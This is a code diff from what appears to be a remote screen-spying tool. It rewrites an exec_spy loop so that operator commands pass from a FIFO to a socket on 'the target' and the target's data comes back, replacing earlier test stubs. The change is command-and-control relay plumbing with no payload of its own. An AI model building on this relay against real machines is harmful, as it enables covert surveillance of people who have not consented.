@@ -23,13 +23,22 @@ void ScreenHunter::exec_spy() {
     if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, tunnel_fifo_in_, &screen_hunter_c2_event) < 0) {
         write_fifo_error("[SpyTunnel::run] Error adding tunnel_socket_ to epoll" + std::string(strerror(errno)));
         return;
-    } 
+    }
+
+    struct epoll_event screen_hunter_tunnel_end_event;
+    screen_hunter_tunnel_end_event.data.fd = tunnel_end_socket_;
+    screen_hunter_tunnel_end_event.events = EPOLLIN;
+    if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, tunnel_end_socket_, &screen_hunter_tunnel_end_event) < 0) {
+        write_fifo_error("[SpyTunnel::run] Error adding tunnel_socket_ to epoll" + std::string(strerror(errno)));
+        return;
+    }
 
     char command[1024] = {0};
+    char buffer[BUFFER_SIZE] = {0};
 
-    struct epoll_event events[2];
+    struct epoll_event events[3];
     while (true) {
-        int nfds = epoll_wait(epoll_fd.fd, events, 2, -1);
+        int nfds = epoll_wait(epoll_fd.fd, events, 3, -1);
 
         if (nfds < 0) {
             return;
@@ -48,56 +57,51 @@ void ScreenHunter::exec_spy() {
                 return;
             } else if (events[i].data.fd == tunnel_fifo_in_) {
                 // Command from screen hunter. Forward the command to the tunnel_socket_
+                std::cout << MAGENTA << "Data received from tunnel_fifo_in_" << RESET << std::endl;
                 rc = read(tunnel_fifo_in_, command, sizeof(command));
                 if (rc <= 0) {
+                    std::cout << MAGENTA << "Failed to read from tunnel_fifo_in_" << RESET << std::endl;
                     write_fifo_error("[SpyTunnel::run] Was unable to read command from tunnel_fifo_in_");
+                    close(tunnel_fifo_in_);
                     return;
                 } 
+
+                rc = send(tunnel_end_socket_, command, rc, 0);
+                if (rc <= 0) {
+                    std::cout << MAGENTA << "Failed to send the command" << RESET << std::endl;
+                    write_fifo_error("[SpyTunnel::run] Was unable to receive buffer from tunnel_end_socket_");
+                    close(tunnel_fifo_in_);
+                    return;
+                }
+
 
                 if (strncmp(command, "exit", 4) == 0) {
                     close(tunnel_fifo_);
                     close(tunnel_fifo_in_);
-                    return ;
-                } else if (rc == 4 && strncmp(command, "test", 4) == 0) {
-                    int test_width = 1920;
-                    int test_height = 1080;
-
-                    uint8_t test_res_buffer[RES_UPDATE_KEY_LEN + 8];
-                    memcpy(test_res_buffer, &test_width, 4);
-                    memcpy(test_res_buffer+4, &test_height, 4);
-                    memcpy(test_res_buffer+8, RES_UPDATE_KEY, RES_UPDATE_KEY_LEN);
-
-                    write(tunnel_fifo_, test_res_buffer, sizeof(test_res_buffer));
-                    break;  
-                } else if (rc == 5 && strncmp(command, "test2", 5) == 0) {
-                    uint8_t test_res_buffer[END_KEY_LEN + 64];
-                    memset(test_res_buffer, 0, 64);
-                    memcpy(test_res_buffer+64, END_KEY, END_KEY_LEN);
-
-                    write(tunnel_fifo_, test_res_buffer, sizeof(test_res_buffer));   
-                    break;
+                    return;
+                } 
+            } else if (events[i].data.fd == tunnel_end_socket_) {
+                // Data from the target. Forward it to tunnel_fifo_
+                std::cout << MAGENTA << "Data received from tunnel_end_socket_" << RESET << std::endl;
+                rc = recv(tunnel_end_socket_, buffer, BUFFER_SIZE, 0);
+                if (rc <= 0) {
+                    std::cout << MAGENTA << "Failed tp receive from tunnel_end_socket_" << RESET << std::endl;
+                    write_fifo_error("[SpyTunnel::run] Was unable to receive buffer from tunnel_end_socket_");
+                    close(tunnel_fifo_in_);
+                    return;
                 }
-                char buffer[BUFFER_SIZE];
-                memcpy(buffer, "I received your command: ", 25);
-                memcpy(buffer + 25, command, rc);
-                buffer[25+rc] = '\0';
 
-                std::cout << MAGENTA << "[ScreenHunter::exec_spy] Command: " << command << " Size: " << rc << std::endl;
-                std::cout << MAGENTA << "[ScreenHunter::exec_spy] Sending:" << buffer << std::endl;
-
-                write(tunnel_fifo_, buffer, rc + 26);
-                break;
-            
-            } else if (events[i].data.fd == tunnel_socket_) {
-                // Data from the target
+                rc = write(tunnel_fifo_, buffer, rc);
+                if (rc <= 0) {
+                    close(tunnel_fifo_);
+                    close(tunnel_fifo_in_);
+                    tunnel_fifo_ = -1;
+                    write_fifo_error("[SpyTunnel::run] Was unable to write buffer to tunnel_fifo_");
+                    return;
+                }
             }
         }
     }
-
-    if (tunnel_fifo_in_ != -1) {
-        close(tunnel_fifo_in_);
-    }
-
 }
 void ScreenHunter::spawn_window() {
     std::string end_key_len_str = std::to_string(END_KEY_LEN);
